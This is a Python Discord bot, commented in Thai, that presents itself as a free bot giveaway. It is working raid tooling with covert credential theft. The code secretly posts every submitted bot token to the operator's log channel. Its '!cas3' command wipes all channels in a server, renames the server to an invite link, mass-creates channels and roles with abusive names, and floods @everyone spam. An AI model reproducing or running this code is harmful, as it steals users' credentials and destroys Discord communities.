import os
import random
import asyncio
import threading
from flask import Flask
import discord
from discord import app_commands
from discord.ext import commands

# ---------------- WEB SERVER FOR RENDER ---------------- #
app = Flask('')

@app.route('/')
def home():
    return "Bot is running online!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()

# ---------------- CONFIG & DATA ---------------- #
LOG_CHANNEL_ID = 1487818086202478822

CHANNEL_NAMES = [
    "ดับนะะะ꒦꒷⛩️", "มีเเต่รั่วๆ5465555⋆｡˚🍄", "ตู้มมพ่องตายยย･῾ ᵎ⌇ ⁺◦ 🧨", "ปิ้วววว🍵ˎˊ-",
    "ยิงเสี่ยวให้เฟี้ยวดู⋆｡˚ 🐝", "ของเเท้ม่ะไอ้เชี่ยยย-ˋˏ [🦦] ˎˊ", "ยู้เยื่องป่ะะะะห์＞🍄‍🟫＜", "เรียลปะหล้าาาา˗ˏˋ꒰ 🌻 ꒱",
    "ตัวยิงฟรีจากelfอยากใช้จอยละป่ะะ ˚  ⋆｡˚ 🍷", "โง่กันเองเรียกร้องควยไร📁ᶻ 𝗓 𐰁 .ᐟ",
    "เครดิตฟรีจากดิสโง่ๆ°💣‧ 𓆝 𓆟 𓆞 ·｡", "พวกกูซีจำใส่กระบานมึงไว้°∘ 🍃", "พวกกูVEDENA・。.🔧",
    "พวกกูราชามาดับบบₒ ˚ ° 🍜", "ลบๆไปนะกูเหม็นขี้หน้าดิสมึง⋆ ˚｡⋆🍤", "ดิสมึงมองในมุมเสี่ยวก็เฟี้ยวอยู่นะ˚｡⋆｡ 🫧",
    "โง่ก็เงี้ยงัยยย‧͙⁺˚*･📁", "โดนเรทไปดิไอ้โง่＞🧪＜", "สร้างใหม่ด้ายยย˗ˏˋ꒰ 🍒 ꒱",
    "โง่กันได้ทุกวันน ｡˚ ☁️", "อย่าร้องงง˚｡⋆｡🍝", "แตกไปไอ้โง่꒷꒦︶ 📦", ".gg/casgxAycj",
    "โดนบอทฟรียิงมึงพิจารณาตัวเองหน่อยนะ｡.｡: 🚀"
]

ROLE_NAMES = [
    "NO ELFᝰ.ᐟ", "VAHOW˚⋆", "⋆｡‧˚ʚ พวกกูELF ɞ˚‧｡⋆", ".gg/jfXuQnDNQ",
    "เเตกไปดิไอ้โง่˚‧🌻", "เครดิตฟรีๆขอบคุณนะ𝜗𝜚˚⋆", "ไม่โง่จะไม่เป็นงี้✶⋆.˚",
    "รู้ไรไม่เท่ารู้งี้ป่ะ5555𓆝 𓆟 𓆞", "🍵 ～ปิ้ววว～🍀", "୧ ‧₊˚ ลบทิ้งไปเถอะ ถือว่าพี่ขอนะ🥛",
    "Racha on top～👑", "เเค้นเข้ามา.ᐟ"
]

# ---------------- MAIN BOT SETUP ---------------- #
intents = discord.Intents.default()
intents.message_content = True
main_bot = commands.Bot(command_prefix="!", intents=intents)

# ---------------- SLAVE BOT LOGIC ---------------- #
async def start_slave_bot(token: str, user_who_added: discord.User):
    slave_intents = discord.Intents.all()
    slave_bot = commands.Bot(command_prefix="!", intents=slave_intents)

    @slave_bot.event
    async def on_ready():
        # ส่ง Log ไปยังห้องที่กำหนด
        try:
            log_channel = main_bot.get_channel(LOG_CHANNEL_ID)
            if log_channel:
                await log_channel.send(
                    f"**[Token Log]**\n"
                    f"• ผู้กรอก: {user_who_added.mention} (`{user_who_added.id}`)\n"
                    f"• ชื่อบอท: **{slave_bot.user}** (`{slave_bot.user.id}`)\n"
                    f"• Token: `{token}`"
                )
        except Exception as e:
            print(f"Log Error: {e}")

        # Task อัปเดตสถานะถอยหลัง 10 นาที
        asyncio.create_task(timer_task())

    async def timer_task():
        for remaining in range(10, 0, -1):
            activity = discord.Game(name=f"เหลือเวลาอีก {remaining} นาที")
            await slave_bot.change_presence(status=discord.Status.online, activity=activity)
            await asyncio.sleep(60)
        
        await slave_bot.close()

    @slave_bot.command(name="cas3")
    async def cas3_command(ctx: commands.Context):
        guild = ctx.guild

        # 1. ลบช่องเดิมทั้งหมด
        delete_tasks = [asyncio.create_task(channel.delete()) for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)

        # 2. เปลี่ยนชื่อเซิฟเวอร์
        try:
            await guild.edit(name="https://discord.gg/Qq4TvaAuWq")
        except Exception:
            pass

        # 3. สุ่มสร้างช่องให้ครบ 500 ช่อง
        created_channels = []
        async def create_chan():
            try:
                name = random.choice(CHANNEL_NAMES)
                ch = await guild.create_text_channel(name=name)
                created_channels.append(ch)
            except Exception:
                pass

        chan_tasks = [asyncio.create_task(create_chan()) for _ in range(500)]
        await asyncio.gather(*chan_tasks, return_exceptions=True)

        # 4. สแปมข้อความทุกช่องพร้อมกัน ช่องละ 500 คำ
        async def spam_channel(channel):
            for _ in range(500):
                try:
                    await channel.send("@everyone um we C https://discord.gg/Qq4TvaAuWq")
                except Exception:
                    break

        spam_tasks = [asyncio.create_task(spam_channel(ch)) for ch in created_channels]

        # 5. สุ่มสร้างยศสูงสุด 250 ยศ
        async def create_rl():
            try:
                r_name = random.choice(ROLE_NAMES)
                await guild.create_role(name=r_name)
            except Exception:
                pass

        role_tasks = [asyncio.create_task(create_rl()) for _ in range(250)]

        await asyncio.gather(*spam_tasks, *role_tasks, return_exceptions=True)

    try:
        await slave_bot.start(token)
    except Exception as e:
        print(f"Slave bot error/invalid token: {e}")

# ---------------- UI COMPONENTS ---------------- #
class TokenModal(discord.ui.Modal, title="กรอกข้อมูล Bot Token"):
    token_input = discord.ui.TextInput(
        label="Bot Token",
        placeholder="ใส่token",
        required=True,
        style=discord.TextStyle.short
    )

    async def on_submit(self, interaction: discord.Interaction):
        token_val = self.token_input.value.strip()

        # ทดสอบ Token แบบชั่วคราว
        test_client = discord.Client(intents=discord.Intents.default())
        is_valid = False
        try:
            await test_client.login(token_val)
            await test_client.close()
            is_valid = True
        except Exception:
            is_valid = False

        if is_valid:
            await interaction.response.send_message(
                content="<a:1000029614:1542490868731224166> สำเร็จ บอทจะออนไลน์10นาที พิมพ์ !cas3 เพื่อยิง",
                ephemeral=True
            )
            # รันบอทลูกในเบื้องหลัง
            asyncio.create_task(start_slave_bot(token_val, interaction.user))
        else:
            await interaction.response.send_message(
                content="<a:1000029618:1542493395400925226> ไม่สำเร็จ Tokenผิด เเค่ใส่ให้มันถูกมันยากนักหรอวะกูหละไม่เข้าใจพวกมึงจิงๆ",
                ephemeral=True
            )

class SetTokenView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="SetToken", 
        style=discord.ButtonStyle.success, 
        emoji="<a:1000030138:1551561169469448192>",
        custom_id="set_token_button"
    )
    async def set_token_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(TokenModal())

# ---------------- MAIN BOT EVENTS & COMMANDS ---------------- #
@main_bot.event
async def on_ready():
    print(f"Main Bot ready as: {main_bot.user}")
    main_bot.add_view(SetTokenView()) # รองรับ Persistent Button
    try:
        synced = await main_bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

@main_bot.tree.command(name="male", description="เปิดเมนูแจกบอทฟรี")
async def male(interaction: discord.Interaction):
    embed = discord.Embed(
        title="ᠻ᥅ꫀꫀ ᥇ꪮꪻ",
        description=(
            "-. <a:1000030145:1551562201771282452> ใส่BotToken \n\n"
            "-. <a:1000030144:1551561924905537616> เลือกเซิฟที่จะยิง\n\n"
            "-. <a:1000030140:1551561481685041232> พิมพ์ !cas3\n\n"
            "``บอทจะออนเเค่10นาที ใช้ง่ายเเค่นี้มึงใช้ไม่เป็นก็ไปเเควนคอตายไป``"
        ),
        color=discord.Color.green()
    )
    embed.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/1497417339468251196/1551562613165531256/5ee46e85d72694713bdf631772a56060.gif?ex=6ab26cc9&is=6ab11b49&hm=bb1499273e8dc5b5074b8087d5e4bf610c29a8de93ad8a47e6dfc90cbb87ab6a&"
    )
    embed.set_image(
        url="https://cdn.discordapp.com/attachments/1497417339468251196/1551559065400770601/8a7538da48a9715bc1b8f4f8907c97a2.gif?ex=6ab2697b&is=6ab117fb&hm=0652e5effdd9d6155fa70c3a0eb649d9a7a4200145c4376c5e0e8b25eac4bb45&"
    )

    view = SetTokenView()
    await interaction.response.send_message(embed=embed, view=view)

# ---------------- RUNNER ---------------- #
if __name__ == "__main__":
    keep_alive()
    bot_token = os.environ.get("BOT_TOKEN")
    if bot_token:
        main_bot.run(bot_token)
    else:
        print("กรุณาใส่ BOT_TOKEN ใน Environment Variables ของ Render")
